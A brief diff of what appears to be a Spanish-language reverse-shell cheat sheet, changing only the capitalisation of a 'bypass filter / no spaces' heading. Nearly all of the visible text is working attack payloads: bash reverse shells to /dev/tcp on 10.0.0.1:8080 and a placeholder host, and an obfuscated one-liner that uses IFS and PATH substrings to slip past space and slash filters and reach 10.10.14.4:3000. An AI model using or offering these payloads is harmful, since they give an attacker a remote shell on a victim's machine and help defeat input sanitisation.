@@ -8,8 +8,8 @@ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 
 0<&196;exec 196<>/dev/tcp/<your IP>/<same unfiltered port>; sh <&196 >&196 2>&196
 ```
-#### BYPASS FILTER:
-SIN ESPACIOS:
+#### BYPASS FILTER
+Sin espacios:
 ```
 IFS=$'\x20';echo${IFS}"bash${IFS}-i${IFS}>&${IFS}${PATH:0:1}dev${PATH:0:1}tcp${PATH:0:1}10.10.14.4${PATH:0:1}3000${IFS}0>&1"|bash
 ```
